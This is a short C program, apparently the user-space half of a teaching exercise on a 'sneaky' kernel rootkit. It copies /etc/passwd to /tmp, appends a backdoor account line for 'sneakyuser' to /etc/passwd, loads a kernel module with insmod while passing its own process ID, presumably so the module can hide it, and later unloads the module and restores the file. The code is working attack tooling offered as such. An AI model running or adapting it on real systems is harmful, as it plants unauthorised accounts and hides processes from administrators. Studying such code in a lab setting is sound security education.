#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

int copy_passwd_file(char * source, char * dest) {
    FILE * source_file = fopen(source,"r");
    if (source_file == NULL) {
        printf("Cannot open passwd source file\n");
        return EXIT_FAILURE;
    }
    FILE * dest_file = fopen(dest,"w");
    if (dest_file == NULL) {
        printf("Cannot open passwd dest file\n");
        return EXIT_FAILURE;
    }
    char * line = NULL;
    size_t sz = 0;
    ssize_t len = 0;
    while((len = getline(&line, &sz, source_file))>=0){
        fputs(line, dest_file);
    }
    free(line);
    fclose(source_file);
    fclose(dest_file);
}

int add_passwd_line(char * file_name, char * line){
    FILE * file = fopen(file_name, "a");
    if (file == NULL) {
        printf("Cannot open file.");
        return EXIT_FAILURE;
    }
    fprintf(file, "%s", line);
    fclose(file);
}

int main(){
    // 1. print its own process ID to the screen
    // “sneaky_process pid = %d\n”, getpid()
    printf("sneaky_process pid = %d\n", getpid());
    // 2. copy the /etc/passwd file (used for user authentication) to a new file: /tmp/passwd.
    copy_passwd_file("/etc/passwd","/tmp/passwd");
    // 3.  print a new line to the end of the file
    // sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
    add_passwd_line("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    // 4. load the sneaky module (sneaky_mod.ko) using the “insmod” command.
    char command[100];
    sprintf(command, "insmod sneaky_mod.ko pid=%d", (int)getpid());
    system(command);
    // 5. loop: reading a character at a time from the keyboard input until it receives the character ‘q’ (for quit).
    char c;
    while ((c = getchar()) != 'q') {
    }
    // 6. unload the sneaky kernel module using the “rmmod” command.
    system("rmmod sneaky_mod.ko");
    // 7. restore the /etc/passwd file
    copy_passwd_file("/tmp/passwd", "/etc/passwd");
    system("rm /tmp/passwd");
    return EXIT_SUCCESS;
}